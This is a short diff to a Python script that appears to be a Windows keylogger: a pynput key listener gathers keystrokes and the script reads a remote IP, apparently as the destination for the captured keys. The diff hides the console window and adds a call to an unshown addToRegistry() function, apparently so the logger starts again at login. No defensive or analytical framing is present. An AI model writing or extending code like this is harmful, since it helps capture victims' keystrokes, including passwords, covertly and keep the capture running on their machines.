@@ -6,6 +6,11 @@ import win32event, win32api, winerror,win32console,win32gui
 import requests
 import datetime
 import threading
+import winreg as reg  
+import os  
+
+win = win32console.GetConsoleWindow() 
+win32gui.ShowWindow(win, 0) 
 
 
 virtual_keyboard={
@@ -58,5 +63,6 @@ def on_press(key):
 		keys.clear()
 
 with Listener(on_press=on_press) as listener:
+	addToRegistry()
 	ip_addr=read_ip()
 	listener.join()
